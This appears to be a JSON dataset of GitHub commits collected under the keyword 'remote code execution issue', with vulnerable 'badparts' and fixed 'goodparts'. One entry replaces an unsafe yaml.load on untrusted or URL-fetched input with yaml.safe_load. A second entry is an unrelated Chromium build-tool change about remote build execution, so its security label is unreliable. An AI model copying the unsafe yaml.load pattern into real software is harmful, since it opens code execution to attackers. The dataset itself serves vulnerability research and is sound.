logic."}},"https:\/\/github.com\/pipermerriam\/flex":{"329c0a8ae6fde575a7d9077f1013fa4a86112d0c":{"url":"https:\/\/api.github.com\/repos\/pipermerriam\/flex\/commits\/329c0a8ae6fde575a7d9077f1013fa4a86112d0c","html_url":"https:\/\/github.com\/pipermerriam\/flex\/commit\/329c0a8ae6fde575a7d9077f1013fa4a86112d0c","sha":"329c0a8ae6fde575a7d9077f1013fa4a86112d0c","keyword":"remote code execution issue","diff":"diff --git a\/flex\/core.py b\/flex\/core.py\nindex 15e2e23..bc9f5a7 100644\n--- a\/flex\/core.py\n+++ b\/flex\/core.py\n@@ -66,7 +66,7 @@ def load_source(source):\n             pass\n \n         try:\n-            return yaml.load(raw_source)\n+            return yaml.safe_load(raw_source)\n         except (yaml.scanner.ScannerError, yaml.parser.ParserError):\n             pass\n     except NameError:\ndiff --git a\/tests\/core\/test_load_source.py b\/tests\/core\/test_load_source.py\nindex d0f063f..a75eed3 100644\n--- a\/tests\/core\/test_load_source.py\n+++ b\/tests\/core\/test_load_source.py\n@@ -27,7 +27,7 @@ def test_json_string():\n \n \n def test_yaml_string():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n     result = load_source(source)\n \n@@ -62,7 +62,7 @@ def test_json_file_path():\n \n \n def test_yaml_file_object():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n \n     tmp_file = tempfile.NamedTemporaryFile(mode='w')\n@@ -76,7 +76,7 @@ def test_yaml_file_object():\n \n \n def test_yaml_file_path():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n \n     tmp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.yaml')\n","message":"","files":{"\/flex\/core.py":{"changes":[{"diff":"\n             pass\n \n         try:\n-            return yaml.load(raw_source)\n+            return yaml.safe_load(raw_source)\n         except (yaml.scanner.ScannerError, yaml.parser.ParserError):\n             pass\n     except NameError:","add":1,"remove":1,"filename":"\/flex\/core.py","badparts":["            return yaml.load(raw_source)"],"goodparts":["            return yaml.safe_load(raw_source)"]},{"diff":"\n             pass\n \n         try:\n-            return yaml.load(raw_source)\n+            return yaml.safe_load(raw_source)\n         except (yaml.scanner.ScannerError, yaml.parser.ParserError):\n             pass\n     except NameError:","add":1,"remove":1,"filename":"\/flex\/core.py","badparts":["            return yaml.load(raw_source)"],"goodparts":["            return yaml.safe_load(raw_source)"]}],"source":"\nfrom __future__ import unicode_literals from six.moves import urllib_parse as urlparse import os import collections import requests import six import json import yaml from flex.context_managers import ErrorDict from flex.exceptions import ValidationError from flex.loading.definitions import( definitions_validator, ) from flex.loading.schema import( swagger_schema_validator, ) from flex.loading.schema.paths.path_item.operation.responses.single.schema import( schema_validator, ) from flex.http import( normalize_request, normalize_response, ) from flex.validation.common import validate_object from flex.validation.request import validate_request from flex.validation.response import validate_response def load_source(source): \"\"\" Common entry point for loading some form of raw swagger schema. Supports: -python object(dictionary-like) -path to yaml file -path to json file -file object(json or yaml). -json string. -yaml string. \"\"\" if isinstance(source, collections.Mapping): return source elif hasattr(source, 'read') and callable(source.read): raw_source=source.read() elif os.path.exists(os.path.expanduser(str(source))): with open(os.path.expanduser(str(source)), 'r') as source_file: raw_source=source_file.read() elif isinstance(source, six.string_types): parts=urlparse.urlparse(source) if parts.scheme and parts.netloc: response=requests.get(source) if isinstance(response.content, six.binary_type): raw_source=six.text_type(response.content, encoding='utf-8') else: raw_source=response.content else: raw_source=source try: try: return json.loads(raw_source) except ValueError: pass try: return yaml.load(raw_source) except(yaml.scanner.ScannerError, yaml.parser.ParserError): pass except NameError: pass raise ValueError( \"Unable to parse `{0}`. Tried yaml and json.\".format(source), ) def parse(raw_schema): context={ 'deferred_references': set(), } swagger_definitions=definitions_validator(raw_schema, context=context) swagger_schema=swagger_schema_validator( raw_schema, context=swagger_definitions, ) return swagger_schema def load(target): \"\"\" Given one of the supported target formats, load a swagger schema into it's python representation. \"\"\" raw_schema=load_source(target) return parse(raw_schema) def validate(raw_schema, target=None, **kwargs): \"\"\" Given the python representation of a JSONschema as defined in the swagger spec, validate that the schema complies to spec. If `target` is provided, that target will be validated against the provided schema. \"\"\" schema=schema_validator(raw_schema, **kwargs) if target is not None: validate_object(target, schema=schema, **kwargs) def validate_api_request(schema, raw_request): request=normalize_request(raw_request) with ErrorDict(): validate_request(request=request, schema=schema) def validate_api_response(schema, raw_response, request_method='get', raw_request=None): \"\"\" Validate the response of an api call against a swagger schema. \"\"\" request=None if raw_request is not None: request=normalize_request(raw_request) response=None if raw_response is not None: response=normalize_response(raw_response, request=request) if response is not None: validate_response( response=response, request_method=request_method, schema=schema ) def validate_api_call(schema, raw_request, raw_response): \"\"\" Validate the request\/response cycle of an api call against a swagger schema. Request\/Response objects from the `requests` and `urllib` library are supported. \"\"\" request=normalize_request(raw_request) with ErrorDict() as errors: try: validate_request( request=request, schema=schema, ) except ValidationError as err: errors['request'].add_error(err.messages or getattr(err, 'detail')) return response=normalize_response(raw_response, raw_request) try: validate_response( response=response, request_method=request.method, schema=schema ) except ValidationError as err: errors['response'].add_error(err.messages or getattr(err, 'detail')) ","sourceWithComments":"from __future__ import unicode_literals\n\nfrom six.moves import urllib_parse as urlparse\nimport os\nimport collections\nimport requests\n\nimport six\nimport json\nimport yaml\n\nfrom flex.context_managers import ErrorDict\nfrom flex.exceptions import ValidationError\nfrom flex.loading.definitions import (\n    definitions_validator,\n)\nfrom flex.loading.schema import (\n    swagger_schema_validator,\n)\nfrom flex.loading.schema.paths.path_item.operation.responses.single.schema import (\n    schema_validator,\n)\nfrom flex.http import (\n    normalize_request,\n    normalize_response,\n)\nfrom flex.validation.common import validate_object\nfrom flex.validation.request import validate_request\nfrom flex.validation.response import validate_response\n\n\ndef load_source(source):\n    \"\"\"\n    Common entry point for loading some form of raw swagger schema.\n\n    Supports:\n        - python object (dictionary-like)\n        - path to yaml file\n        - path to json file\n        - file object (json or yaml).\n        - json string.\n        - yaml string.\n    \"\"\"\n    if isinstance(source, collections.Mapping):\n        return source\n    elif hasattr(source, 'read') and callable(source.read):\n        raw_source = source.read()\n    elif os.path.exists(os.path.expanduser(str(source))):\n        with open(os.path.expanduser(str(source)), 'r') as source_file:\n            raw_source = source_file.read()\n    elif isinstance(source, six.string_types):\n        parts = urlparse.urlparse(source)\n        if parts.scheme and parts.netloc:\n            response = requests.get(source)\n            if isinstance(response.content, six.binary_type):\n                raw_source = six.text_type(response.content, encoding='utf-8')\n            else:\n                raw_source = response.content\n        else:\n            raw_source = source\n\n    try:\n        try:\n            return json.loads(raw_source)\n        except ValueError:\n            pass\n\n        try:\n            return yaml.load(raw_source)\n        except (yaml.scanner.ScannerError, yaml.parser.ParserError):\n            pass\n    except NameError:\n        pass\n\n    raise ValueError(\n        \"Unable to parse `{0}`.  Tried yaml and json.\".format(source),\n    )\n\n\ndef parse(raw_schema):\n    context = {\n        'deferred_references': set(),\n    }\n    swagger_definitions = definitions_validator(raw_schema, context=context)\n\n    swagger_schema = swagger_schema_validator(\n        raw_schema,\n        context=swagger_definitions,\n    )\n    return swagger_schema\n\n\ndef load(target):\n    \"\"\"\n    Given one of the supported target formats, load a swagger schema into it's\n    python representation.\n    \"\"\"\n    raw_schema = load_source(target)\n    return parse(raw_schema)\n\n\ndef validate(raw_schema, target=None, **kwargs):\n    \"\"\"\n    Given the python representation of a JSONschema as defined in the swagger\n    spec, validate that the schema complies to spec.  If `target` is provided,\n    that target will be validated against the provided schema.\n    \"\"\"\n    schema = schema_validator(raw_schema, **kwargs)\n    if target is not None:\n        validate_object(target, schema=schema, **kwargs)\n\n\ndef validate_api_request(schema, raw_request):\n    request = normalize_request(raw_request)\n\n    with ErrorDict():\n        validate_request(request=request, schema=schema)\n\n\ndef validate_api_response(schema, raw_response, request_method='get', raw_request=None):\n    \"\"\"\n    Validate the response of an api call against a swagger schema.\n    \"\"\"\n    request = None\n    if raw_request is not None:\n        request = normalize_request(raw_request)\n\n    response = None\n    if raw_response is not None:\n        response = normalize_response(raw_response, request=request)\n\n    if response is not None:\n        validate_response(\n            response=response,\n            request_method=request_method,\n            schema=schema\n        )\n\n\ndef validate_api_call(schema, raw_request, raw_response):\n    \"\"\"\n    Validate the request\/response cycle of an api call against a swagger\n    schema.  Request\/Response objects from the `requests` and `urllib` library\n    are supported.\n    \"\"\"\n    request = normalize_request(raw_request)\n\n    with ErrorDict() as errors:\n        try:\n            validate_request(\n                request=request,\n                schema=schema,\n            )\n        except ValidationError as err:\n            errors['request'].add_error(err.messages or getattr(err, 'detail'))\n            return\n\n        response = normalize_response(raw_response, raw_request)\n\n        try:\n            validate_response(\n                response=response,\n                request_method=request.method,\n                schema=schema\n            )\n        except ValidationError as err:\n            errors['response'].add_error(err.messages or getattr(err, 'detail'))\n"},"\/tests\/core\/test_load_source.py":{"changes":[{"diff":"\n \n \n def test_yaml_string():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n     result = load_source(source)\n \n","add":1,"remove":1,"filename":"\/tests\/core\/test_load_source.py","badparts":["    native = {'foo': 'bar'}"],"goodparts":["    native = {b'foo': b'bar'}"]},{"diff":"\n \n \n def test_yaml_file_object():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n \n     tmp_file = tempfile.NamedTemporaryFile(mode='w')\n","add":1,"remove":1,"filename":"\/tests\/core\/test_load_source.py","badparts":["    native = {'foo': 'bar'}"],"goodparts":["    native = {b'foo': b'bar'}"]},{"diff":"\n \n \n def test_yaml_file_path():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n \n     tmp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.yaml')\n","add":1,"remove":1,"filename":"\/tests\/core\/test_load_source.py","badparts":["    native = {'foo': 'bar'}"],"goodparts":["    native = {b'foo': b'bar'}"]},{"diff":"\n \n \n def test_yaml_string():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n     result = load_source(source)\n \n","add":1,"remove":1,"filename":"\/tests\/core\/test_load_source.py","badparts":["    native = {'foo': 'bar'}"],"goodparts":["    native = {b'foo': b'bar'}"]},{"diff":"\n \n \n def test_yaml_file_object():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n \n     tmp_file = tempfile.NamedTemporaryFile(mode='w')\n","add":1,"remove":1,"filename":"\/tests\/core\/test_load_source.py","badparts":["    native = {'foo': 'bar'}"],"goodparts":["    native = {b'foo': b'bar'}"]},{"diff":"\n \n \n def test_yaml_file_path():\n-    native = {'foo': 'bar'}\n+    native = {b'foo': b'bar'}\n     source = yaml.dump(native)\n \n     tmp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.yaml')\n","add":1,"remove":1,"filename":"\/tests\/core\/test_load_source.py","badparts":["    native = {'foo': 'bar'}"],"goodparts":["    native = {b'foo': b'bar'}"]}],"source":"\nfrom __future__ import unicode_literals import tempfile import collections import six import json import yaml from flex.core import load_source def test_native_mapping_is_passthrough(): source={'foo': 'bar'} result=load_source(source) assert result==source def test_json_string(): native={'foo': 'bar'} source=json.dumps(native) result=load_source(source) assert result==native def test_yaml_string(): native={'foo': 'bar'} source=yaml.dump(native) result=load_source(source) assert result==native def test_json_file_object(): native={'foo': 'bar'} source=json.dumps(native) tmp_file=tempfile.NamedTemporaryFile(mode='w') tmp_file.write(source) tmp_file.file.seek(0) with open(tmp_file.name) as json_file: result=load_source(json_file) assert result==native def test_json_file_path(): native={'foo': 'bar'} source=json.dumps(native) tmp_file=tempfile.NamedTemporaryFile(mode='w', suffix='.json') tmp_file.write(source) tmp_file.flush() result=load_source(tmp_file.name) assert result==native def test_yaml_file_object(): native={'foo': 'bar'} source=yaml.dump(native) tmp_file=tempfile.NamedTemporaryFile(mode='w') tmp_file.write(source) tmp_file.flush() with open(tmp_file.name) as yaml_file: result=load_source(yaml_file) assert result==native def test_yaml_file_path(): native={'foo': 'bar'} source=yaml.dump(native) tmp_file=tempfile.NamedTemporaryFile(mode='w', suffix='.yaml') tmp_file.write(source) tmp_file.flush() result=load_source(tmp_file.name) assert result==native def test_url(httpbin): native={ 'origin': '127.0.0.1', 'args':{}, } source=httpbin.url +'\/get' result=load_source(source) assert isinstance(result, collections.Mapping) result.pop('headers') result.pop('url') assert result==native ","sourceWithComments":"from __future__ import unicode_literals\n\nimport tempfile\nimport collections\n\nimport six\n\nimport json\nimport yaml\n\nfrom flex.core import load_source\n\n\ndef test_native_mapping_is_passthrough():\n    source = {'foo': 'bar'}\n    result = load_source(source)\n\n    assert result == source\n\n\ndef test_json_string():\n    native = {'foo': 'bar'}\n    source = json.dumps(native)\n    result = load_source(source)\n\n    assert result == native\n\n\ndef test_yaml_string():\n    native = {'foo': 'bar'}\n    source = yaml.dump(native)\n    result = load_source(source)\n\n    assert result == native\n\n\ndef test_json_file_object():\n    native = {'foo': 'bar'}\n    source = json.dumps(native)\n\n    tmp_file = tempfile.NamedTemporaryFile(mode='w')\n    tmp_file.write(source)\n    tmp_file.file.seek(0)\n\n    with open(tmp_file.name) as json_file:\n        result = load_source(json_file)\n\n    assert result == native\n\n\ndef test_json_file_path():\n    native = {'foo': 'bar'}\n    source = json.dumps(native)\n\n    tmp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.json')\n    tmp_file.write(source)\n    tmp_file.flush()\n\n    result = load_source(tmp_file.name)\n\n    assert result == native\n\n\ndef test_yaml_file_object():\n    native = {'foo': 'bar'}\n    source = yaml.dump(native)\n\n    tmp_file = tempfile.NamedTemporaryFile(mode='w')\n    tmp_file.write(source)\n    tmp_file.flush()\n\n    with open(tmp_file.name) as yaml_file:\n        result = load_source(yaml_file)\n\n    assert result == native\n\n\ndef test_yaml_file_path():\n    native = {'foo': 'bar'}\n    source = yaml.dump(native)\n\n    tmp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.yaml')\n    tmp_file.write(source)\n    tmp_file.flush()\n\n    result = load_source(tmp_file.name)\n\n    assert result == native\n\n\ndef test_url(httpbin):\n    native = {\n        'origin': '127.0.0.1',\n        #'headers': {\n        #    'Content-Length': '',\n        #    'Accept-Encoding': 'gzip, deflate',\n        #    'Host': '127.0.0.1:54634',\n        #    'Accept': '*\/*',\n        #    'User-Agent': 'python-requests\/2.4.3 CPython\/2.7.8 Darwin\/14.0.0',\n        #    'Connection': 'keep-alive',\n        #},\n        'args': {},\n        #'url': 'http:\/\/127.0.0.1:54634\/get',\n    }\n    source = httpbin.url + '\/get'\n    result = load_source(source)\n    assert isinstance(result, collections.Mapping)\n    result.pop('headers')\n    result.pop('url')\n    assert result == native\n"}},"msg":"Fix remote code execution issue with yaml.load"}},"https:\/\/github.com\/AeonGames\/build":{"e831815137b4a2f6d3a2892f10331dcdfe1ea6dd":{"url":"https:\/\/api.github.com\/repos\/AeonGames\/build\/commits\/e831815137b4a2f6d3a2892f10331dcdfe1ea6dd","html_url":"https:\/\/github.com\/AeonGames\/build\/commit\/e831815137b4a2f6d3a2892f10331dcdfe1ea6dd","message":"Fix action_remote for mojo by sharing path rebasing logic\n\nThere is a mismatch in how action_remote.py and mojom_parser.py currently attempt to find mojo module files.\n\nBecause of this mismatch, incremental remote execution of mojo actions may produce incorrect results. This is because reproxy is given an incorrect set of mojo module inputs and therefore may use old versions of mojom-module files.\n\nBecause the path rebase logic is not a trivially small amount of code, let's resolve the issue by making it public for action_remote to be able to import.\n\n(This CL is a continuation of the prototype https:\/\/crrev.com\/c\/4075247. For reference, the original CL description is below:)\n\nfix action_remote for mojo\n\nmojo custom processor failed to find *.mojom-module\nfor runtime_feature_state.\nso\n ..\/..\/mojo\/public\/tools\/mojom\/mojom_parsre.py .. --mojom-file-list=gen\/third_party\/blink\/public\/mojom\/mojom_core__parser.rsp ..\nfailed with exit=1, but it returns previous navigation_params.mojom-module as outputs (which is also included as inputs).\naction digest: \"f258e220065cf46e0ad020db10b8a42a73930d062e43d546015022fd36774c42\/147\"\nnavigation_params.mojom-module digest:\n\"a91fb5b68f841937aab12f1b9c29c3dd27545eb595c24e33fbf180e999f2fa07\/8342596\"\nThis action completed with STATUS_LOCAL_FALLBACK.\n\nLocal fallback should update the navigation_params.mojom-module,\nbut reproxy uses old navigation_params.mojom-module for\n ..\/..\/mojo\/public\/tools\/bindings\/mojom_bindings_generator.py .. --filelist=gen\/third_party\/blink\/public\/mojom\/mojom_core__generate_message_ids.rsp .. -g c++ --typemap ..\naction_digest: \"ad7e49d83251359892b2cd3b56856a1dfe68ea6844acbdba377bed6ac041db86\/148\"\nand produces bad navigation_params.mojom.h etc.\n\nThose bad navigation_params.mojom.h etc is used for compile\nfor obj\/content\/browser\/browser\/navigation_entry_impl.o\nand caused compile error.\naction digest: \"ce346c0790d03df02e9610a894ac04c0a64845c89f8ce74cd47ff3ad6bcf1a4a\/147\"\n\nThis CL fixes the first mojom custom processor error, so\nit makes mojom_parser.py successful, and reproxy could use\nthe correct navigation_params.mojom-module in the following steps.\n\n(RBE instance is projects\/goma-foundry-experiments\/instances\/default_instance)\n\nBug: b\/253987456, chromium:1395172\nChange-Id: I8dca6eef82d5f6d01b1d6472a509f92a6d6cd5a1\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/4170097\nReviewed-by: Takuto Ikuta <tikuta@chromium.org>\nCommit-Queue: Richard Wang <richardwa@google.com>\nReviewed-by: Daniel Cheng <dcheng@chromium.org>\nCr-Commit-Position: refs\/heads\/main@{#1093708}\nNOKEYCHECK=True\nGitOrigin-RevId: f1e842fe6214b96b074299101986e767a692e772","sha":"e831815137b4a2f6d3a2892f10331dcdfe1ea6dd","keyword":"remote code execution issue","diff":"diff --git a\/util\/action_remote.py b\/util\/action_remote.py\nindex 1e9517ddf..09fd56981 100755\n--- a\/util\/action_remote.py\n+++ b\/util\/action_remote.py\n@@ -14,6 +14,8 @@\n import sys\n from enum import Enum\n \n+from mojo.public.tools.mojom.mojom_parser import RebaseAbsolutePath\n+\n \n class CustomProcessor(Enum):\n   mojom_parser = 'mojom_parser'\n@@ -22,8 +24,8 @@ def __str__(self):\n     return self.value\n \n \n-def _process_build_metadata_json(bm_file, exec_root, working_dir, output_root,\n-                                 re_outputs, processed_inputs):\n+def _process_build_metadata_json(bm_file, input_roots, output_root, re_outputs,\n+                                 processed_inputs):\n   \"\"\"Recursively find mojom_parser inputs from a build_metadata file.\"\"\"\n   if bm_file in processed_inputs:\n     return\n@@ -31,7 +33,6 @@ def _process_build_metadata_json(bm_file, exec_root, working_dir, output_root,\n   processed_inputs.add(bm_file)\n \n   bm_dir = os.path.dirname(bm_file)\n-  wd_rel = os.path.relpath(working_dir, exec_root)\n \n   with open(bm_file) as f:\n     bm = json.load(f)\n@@ -41,8 +42,9 @@ def _process_build_metadata_json(bm_file, exec_root, working_dir, output_root,\n     src = os.path.normpath(os.path.join(bm_dir, s))\n     if src not in processed_inputs and os.path.exists(src):\n       processed_inputs.add(src)\n-    src_module = os.path.normpath(\n-        os.path.join(output_root, os.path.join(wd_rel, src + \"-module\")))\n+    src_module = os.path.join(\n+        output_root,\n+        RebaseAbsolutePath(os.path.abspath(src), input_roots) + \"-module\")\n     if src_module in re_outputs:\n       continue\n     if src_module not in processed_inputs and os.path.exists(src_module):\n@@ -51,8 +53,8 @@ def _process_build_metadata_json(bm_file, exec_root, working_dir, output_root,\n   # Recurse into build_metadata deps.\n   for d in bm[\"deps\"]:\n     dep = os.path.normpath(os.path.join(bm_dir, d))\n-    _process_build_metadata_json(dep, exec_root, working_dir, output_root,\n-                                 re_outputs, processed_inputs)\n+    _process_build_metadata_json(dep, input_roots, output_root, re_outputs,\n+                                 processed_inputs)\n \n \n def _get_mojom_parser_inputs(exec_root, output_files, extra_args):\n@@ -67,12 +69,17 @@ def _get_mojom_parser_inputs(exec_root, output_files, extra_args):\n   argparser = argparse.ArgumentParser()\n   argparser.add_argument('--check-imports', dest='check_imports', required=True)\n   argparser.add_argument('--output-root', dest='output_root', required=True)\n+  argparser.add_argument('--input-root',\n+                         default=[],\n+                         action='append',\n+                         dest='input_root_paths')\n   mojom_parser_args, _ = argparser.parse_known_args(args=extra_args)\n \n+  input_roots = list(map(os.path.abspath, mojom_parser_args.input_root_paths))\n+  output_root = os.path.abspath(mojom_parser_args.output_root)\n   processed_inputs = set()\n-  _process_build_metadata_json(mojom_parser_args.check_imports, exec_root,\n-                               os.getcwd(), mojom_parser_args.output_root,\n-                               output_files, processed_inputs)\n+  _process_build_metadata_json(mojom_parser_args.check_imports, input_roots,\n+                               output_root, output_files, processed_inputs)\n \n   # Rebase paths onto rewrapper exec root.\n   return map(lambda dep: os.path.normpath(os.path.relpath(dep, exec_root)),\n","files":{"\/util\/action_remote.py":{"changes":[{"diff":"\n     return self.value\n \n \n-def _process_build_metadata_json(bm_file, exec_root, working_dir, output_root,\n-                                 re_outputs, processed_inputs):\n+def _process_build_metadata_json(bm_file, input_roots, output_root, re_outputs,\n+                                 processed_inputs):\n   \"\"\"Recursively find mojom_parser inputs from a build_metadata file.\"\"\"\n   if bm_file in processed_inputs:\n     return\n","add":2,"remove":2,"filename":"\/util\/action_remote.py","badparts":["def _process_build_metadata_json(bm_file, exec_root, working_dir, output_root,","                                 re_outputs, processed_inputs):"],"goodparts":["def _process_build_metadata_json(bm_file, input_roots, output_root, re_outputs,","                                 processed_inputs):"]},{"diff":"\n   processed_inputs.add(bm_file)\n \n   bm_dir = os.path.dirname(bm_file)\n-  wd_rel = os.path.relpath(working_dir, exec_root)\n \n   with open(bm_file) as f:\n     bm = json.load(f)\n","add":0,"remove":1,"filename":"\/util\/action_remote.py","badparts":["  wd_rel = os.path.relpath(working_dir, exec_root)"],"goodparts":[]},{"diff":"\n     src = os.path.normpath(os.path.join(bm_dir, s))\n     if src not in processed_inputs and os.path.exists(src):\n       processed_inputs.add(src)\n-    src_module = os.path.normpath(\n-        os.path.join(output_root, os.path.join(wd_rel, src + \"-module\")))\n+    src_module = os.path.join(\n+        output_root,\n+        RebaseAbsolutePath(os.path.abspath(src), input_roots) + \"-module\")\n     if src_module in re_outputs:\n       continue\n     if src_module not in processed_inputs and os.path.exists(src_module):\n","add":3,"remove":2,"filename":"\/util\/action_remote.py","badparts":["    src_module = os.path.normpath(","        os.path.join(output_root, os.path.join(wd_rel, src + \"-module\")))"],"goodparts":["    src_module = os.path.join(","        output_root,","        RebaseAbsolutePath(os.path.abspath(src), input_roots) + \"-module\")"]},{"diff":"\n   # Recurse into build_metadata deps.\n   for d in bm[\"deps\"]:\n     dep = os.path.normpath(os.path.join(bm_dir, d))\n-    _process_build_metadata_json(dep, exec_root, working_dir, output_root,\n-                                 re_outputs, processed_inputs)\n+    _process_build_metadata_json(dep, input_roots, output_root, re_outputs,\n+                                 processed_inputs)\n \n \n def _get_mojom_parser_inputs(exec_root, output_files, extra_args):\n","add":2,"remove":2,"filename":"\/util\/action_remote.py","badparts":["    _process_build_metadata_json(dep, exec_root, working_dir, output_root,","                                 re_outputs, processed_inputs)"],"goodparts":["    _process_build_metadata_json(dep, input_roots, output_root, re_outputs,","                                 processed_inputs)"]},{"diff":"\n   argparser = argparse.ArgumentParser()\n   argparser.add_argument('--check-imports', dest='check_imports', required=True)\n   argparser.add_argument('--output-root', dest='output_root', required=True)\n+  argparser.add_argument('--input-root',\n+                         default=[],\n+                         action='append',\n+                         dest='input_root_paths')\n   mojom_parser_args, _ = argparser.parse_known_args(args=extra_args)\n \n+  input_roots = list(map(os.path.abspath, mojom_parser_args.input_root_paths))\n+  output_root = os.path.abspath(mojom_parser_args.output_root)\n   processed_inputs = set()\n-  _process_build_metadata_json(mojom_parser_args.check_imports, exec_root,\n-                               os.getcwd(), mojom_parser_args.output_root,\n-                               output_files, processed_inputs)\n+  _process_build_metadata_json(mojom_parser_args.check_imports, input_roots,\n+                               output_root, output_files, processed_inputs)\n \n   # Rebase paths onto rewrapper exec root.\n   return map(lambda dep: os.path.normpath(os.path.relpath(dep, exec_root)),\n","add":8,"remove":3,"filename":"\/util\/action_remote.py","badparts":["  _process_build_metadata_json(mojom_parser_args.check_imports, exec_root,","                               os.getcwd(), mojom_parser_args.output_root,","                               output_files, processed_inputs)"],"goodparts":["  argparser.add_argument('--input-root',","                         default=[],","                         action='append',","                         dest='input_root_paths')","  input_roots = list(map(os.path.abspath, mojom_parser_args.input_root_paths))","  output_root = os.path.abspath(mojom_parser_args.output_root)","  _process_build_metadata_json(mojom_parser_args.check_imports, input_roots,","                               output_root, output_files, processed_inputs)"]},{"diff":"\n     return self.value\n \n \n-def _process_build_metadata_json(bm_file, exec_root, working_dir, output_root,\n-                                 re_outputs, processed_inputs):\n+def _process_build_metadata_json(bm_file, input_roots, output_root, re_outputs,\n+                                 processed_inputs):\n   \"\"\"Recursively find mojom_parser inputs from a build_metadata file.\"\"\"\n   if bm_file in processed_inputs:\n     return\n","add":2,"remove":2,"filename":"\/util\/action_remote.py","badparts":["def _process_build_metadata_json(bm_file, exec_root, working_dir, output_root,","                                 re_outputs, processed_inputs):"],"goodparts":["def _process_build_metadata_json(bm_file, input_roots, output_root, re_outputs,","                                 processed_inputs):"]},{"diff":"\n   processed_inputs.add(bm_file)\n \n   bm_dir = os.path.dirname(bm_file)\n-  wd_rel = os.path.relpath(working_dir, exec_root)\n \n   with open(bm_file) as f:\n     bm = json.load(f)\n","add":0,"remove":1,"filename":"\/util\/action_remote.py","badparts":["  wd_rel = os.path.relpath(working_dir, exec_root)"],"goodparts":[]},{"diff":"\n     src = os.path.normpath(os.path.join(bm_dir, s))\n     if src not in processed_inputs and os.path.exists(src):\n       processed_inputs.add(src)\n-    src_module = os.path.normpath(\n-        os.path.join(output_root, os.path.join(wd_rel, src + \"-module\")))\n+    src_module = os.path.join(\n+        output_root,\n+        RebaseAbsolutePath(os.path.abspath(src), input_roots) + \"-module\")\n     if src_module in re_outputs:\n       continue\n     if src_module not in processed_inputs and os.path.exists(src_module):\n","add":3,"remove":2,"filename":"\/util\/action_remote.py","badparts":["    src_module = os.path.normpath(","        os.path.join(output_root, os.path.join(wd_rel, src + \"-module\")))"],"goodparts":["    src_module = os.path.join(","        output_root,","        RebaseAbsolutePath(os.path.abspath(src), input_roots) + \"-module\")"]},{"diff":"\n   # Recurse into build_metadata deps.\n   for d in bm[\"deps\"]:\n     dep = os.path.normpath(os.path.join(bm_dir, d))\n-    _process_build_metadata_json(dep, exec_root, working_dir, output_root,\n-                                 re_outputs, processed_inputs)\n+    _process_build_metadata_json(dep, input_roots, output_root, re_outputs,\n+                                 processed_inputs)\n \n \n def _get_mojom_parser_inputs(exec_root, output_files, extra_args):\n","add":2,"remove":2,"filename":"\/util\/action_remote.py","badparts":["    _process_build_metadata_json(dep, exec_root, working_dir, output_root,","                                 re_outputs, processed_inputs)"],"goodparts":["    _process_build_metadata_json(dep, input_roots, output_root, re_outputs,","                                 processed_inputs)"]},{"diff":"\n   argparser = argparse.ArgumentParser()\n   argparser.add_argument('--check-imports', dest='check_imports', required=True)\n   argparser.add_argument('--output-root', dest='output_root', required=True)\n+  argparser.add_argument('--input-root',\n+                         default=[],\n+                         action='append',\n+                         dest='input_root_paths')\n   mojom_parser_args, _ = argparser.parse_known_args(args=extra_args)\n \n+  input_roots = list(map(os.path.abspath, mojom_parser_args.input_root_paths))\n+  output_root = os.path.abspath(mojom_parser_args.output_root)\n   processed_inputs = set()\n-  _process_build_metadata_json(mojom_parser_args.check_imports, exec_root,\n-                               os.getcwd(), mojom_parser_args.output_root,\n-                               output_files, processed_inputs)\n+  _process_build_metadata_json(mojom_parser_args.check_imports, input_roots,\n+                               output_root, output_files, processed_inputs)\n \n   # Rebase paths onto rewrapper exec root.\n   return map(lambda dep: os.path.normpath(os.path.relpath(dep, exec_root)),\n","add":8,"remove":3,"filename":"\/util\/action_remote.py","badparts":["  _process_build_metadata_json(mojom_parser_args.check_imports, exec_root,","                               os.getcwd(), mojom_parser_args.output_root,","                               output_files, processed_inputs)"],"goodparts":["  argparser.add_argument('--input-root',","                         default=[],","                         action='append',","                         dest='input_root_paths')","  input_roots = list(map(os.path.abspath, mojom_parser_args.input_root_paths))","  output_root = os.path.abspath(mojom_parser_args.output_root)","  _process_build_metadata_json(mojom_parser_args.check_imports, input_roots,","                               output_root, output_files, processed_inputs)"]}],"source":"\n \"\"\"Wrapper script to run action remotely through rewrapper with gn. Also includes Chromium-specific input processors which don't make sense to be reclient inbuilt input processors.\"\"\" import argparse import json import os import subprocess import sys from enum import Enum class CustomProcessor(Enum): mojom_parser='mojom_parser' def __str__(self): return self.value def _process_build_metadata_json(bm_file, exec_root, working_dir, output_root, re_outputs, processed_inputs): \"\"\"Recursively find mojom_parser inputs from a build_metadata file.\"\"\" if bm_file in processed_inputs: return processed_inputs.add(bm_file) bm_dir=os.path.dirname(bm_file) wd_rel=os.path.relpath(working_dir, exec_root) with open(bm_file) as f: bm=json.load(f) for s in bm[\"sources\"]: src=os.path.normpath(os.path.join(bm_dir, s)) if src not in processed_inputs and os.path.exists(src): processed_inputs.add(src) src_module=os.path.normpath( os.path.join(output_root, os.path.join(wd_rel, src +\"-module\"))) if src_module in re_outputs: continue if src_module not in processed_inputs and os.path.exists(src_module): processed_inputs.add(src_module) for d in bm[\"deps\"]: dep=os.path.normpath(os.path.join(bm_dir, d)) _process_build_metadata_json(dep, exec_root, working_dir, output_root, re_outputs, processed_inputs) def _get_mojom_parser_inputs(exec_root, output_files, extra_args): \"\"\"Get mojom inputs by walking generated build_metadata files. This is less complexity and disk I\/O compared to parsing mojom files for imports and finding all imports. Start from the root build_metadata file 